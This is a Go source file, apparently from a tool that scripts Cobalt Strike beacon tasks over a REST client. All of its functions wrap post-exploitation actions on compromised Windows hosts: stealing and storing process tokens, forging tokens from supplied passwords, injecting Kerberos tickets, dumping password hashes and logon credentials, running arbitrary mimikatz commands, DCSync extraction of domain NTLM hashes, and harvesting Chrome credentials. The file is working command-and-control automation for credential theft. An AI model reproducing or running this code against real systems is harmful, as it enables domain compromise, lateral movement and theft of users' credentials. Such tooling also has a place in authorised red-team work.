package workflow

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"

	csclient "github.com/xenov-x/csrest"
)

// executeStealToken steals a token from a process
func (e *Executor) executeStealToken(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for steal_token")
	}

	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid parameter must be a number")
	}

	resp, err := client.StealToken(ctx, beaconID, pid)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeMakeToken creates a token from specified credentials using domain/user/password
func (e *Executor) executeMakeToken(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	domain, _ := action.Parameters["domain"].(string)
	user, ok := action.Parameters["user"].(string)
	if !ok {
		return "", fmt.Errorf("user parameter required for make_token")
	}
	password, ok := action.Parameters["password"].(string)
	if !ok {
		return "", fmt.Errorf("password parameter required for make_token")
	}

	resp, err := client.MakeToken(ctx, beaconID, domain, user, password)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeMakeTokenUpn creates a token from specified credentials using UPN
func (e *Executor) executeMakeTokenUpn(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	upn, ok := action.Parameters["upn"].(string)
	if !ok {
		return "", fmt.Errorf("upn parameter required for make_token_upn")
	}
	password, ok := action.Parameters["password"].(string)
	if !ok {
		return "", fmt.Errorf("password parameter required for make_token_upn")
	}

	resp, err := client.MakeTokenUpn(ctx, beaconID, upn, password)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeRev2Self reverts to the original security context
func (e *Executor) executeRev2Self(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Rev2Self(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeKerberosTicketUse applies a Kerberos ticket to the session
func (e *Executor) executeKerberosTicketUse(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	ticketPath, ok := action.Parameters["ticket"].(string)
	if !ok {
		return "", fmt.Errorf("ticket parameter required for kerberos_ticket_use")
	}

	// Read ticket file and base64 encode it
	ticketData, err := os.ReadFile(ticketPath)
	if err != nil {
		return "", fmt.Errorf("failed to read ticket file: %w", err)
	}
	ticketBase64 := base64.StdEncoding.EncodeToString(ticketData)

	// Use @files/ prefix for the ticket reference
	ticketRef := "@files/" + ticketPath

	resp, err := client.KerberosTicketUse(ctx, beaconID, ticketRef, ticketBase64)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeKerberosTicketPurge purges Kerberos tickets from the session
func (e *Executor) executeKerberosTicketPurge(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.KerberosTicketPurge(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreSteal steals a token and stores it in the token store
func (e *Executor) executeTokenStoreSteal(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for token_store_steal")
	}

	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid parameter must be a number")
	}

	resp, err := client.TokenStoreSteal(ctx, beaconID, pid)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreStealAndUse steals a token, stores it, and immediately applies it
func (e *Executor) executeTokenStoreStealAndUse(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	pidVal, ok := action.Parameters["pid"]
	if !ok {
		return "", fmt.Errorf("pid parameter required for token_store_steal_use")
	}

	var pid int
	switch v := pidVal.(type) {
	case float64:
		pid = int(v)
	case int:
		pid = v
	default:
		return "", fmt.Errorf("pid parameter must be a number")
	}

	resp, err := client.TokenStoreStealAndUse(ctx, beaconID, pid)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreUse uses a token from the token store
func (e *Executor) executeTokenStoreUse(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	idVal, ok := action.Parameters["id"]
	if !ok {
		return "", fmt.Errorf("id parameter required for token_store_use")
	}

	var id int
	switch v := idVal.(type) {
	case float64:
		id = int(v)
	case int:
		id = v
	default:
		return "", fmt.Errorf("id parameter must be a number")
	}

	resp, err := client.TokenStoreUse(ctx, beaconID, id)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreRemove removes a specific token from the token store
func (e *Executor) executeTokenStoreRemove(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	idVal, ok := action.Parameters["id"]
	if !ok {
		return "", fmt.Errorf("id parameter required for token_store_remove")
	}

	var id int
	switch v := idVal.(type) {
	case float64:
		id = int(v)
	case int:
		id = v
	default:
		return "", fmt.Errorf("id parameter must be a number")
	}

	resp, err := client.TokenStoreRemove(ctx, beaconID, id)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreRemoveAll removes all tokens from the token store
func (e *Executor) executeTokenStoreRemoveAll(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.TokenStoreRemoveAll(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeTokenStoreList lists all tokens in the token store
func (e *Executor) executeTokenStoreList(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.TokenStoreList(ctx, beaconID)
	if err != nil {
		return "", err
	}

	// Format the token list as a string for output
	output := fmt.Sprintf("Token Store (%d tokens):\n", len(resp.Tokens))
	for _, token := range resp.Tokens {
		output += fmt.Sprintf("  ID: %d, PID: %d, User: %s, Time: %s\n",
			token.ID, token.PID, token.User, token.Timestamp)
	}

	return output, nil
}

// executeHashdump dumps password hashes
func (e *Executor) executeHashdump(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.Hashdump(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeLogonPasswords dumps plaintext credentials and NTLM hashes
func (e *Executor) executeLogonPasswords(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.LogonPasswords(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeMimikatz executes a mimikatz command
func (e *Executor) executeMimikatz(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	command, ok := action.Parameters["command"].(string)
	if !ok {
		return "", fmt.Errorf("command parameter required for mimikatz")
	}

	mode, ok := action.Parameters["mode"].(string)
	if !ok {
		mode = "normal" // default mode
	}

	// Validate mode
	if mode != "normal" && mode != "elevate" && mode != "impersonate" {
		return "", fmt.Errorf("mode must be one of: normal, elevate, impersonate")
	}

	resp, err := client.Mimikatz(ctx, beaconID, command, mode)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeDcSync extracts NTLM password hash for domain users
func (e *Executor) executeDcSync(ctx context.Context, client *csclient.Client, beaconID string, action Action) (string, error) {
	domain, ok := action.Parameters["domain"].(string)
	if !ok {
		return "", fmt.Errorf("domain parameter required for dcsync")
	}

	user, _ := action.Parameters["user"].(string) // optional

	resp, err := client.DcSync(ctx, beaconID, domain, user)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}

// executeChromeDump recovers credential material from Google Chrome
func (e *Executor) executeChromeDump(ctx context.Context, client *csclient.Client, beaconID string) (string, error) {
	resp, err := client.ChromeDump(ctx, beaconID)
	if err != nil {
		return "", err
	}

	return e.waitForOutput(ctx, client, resp.TaskID)
}
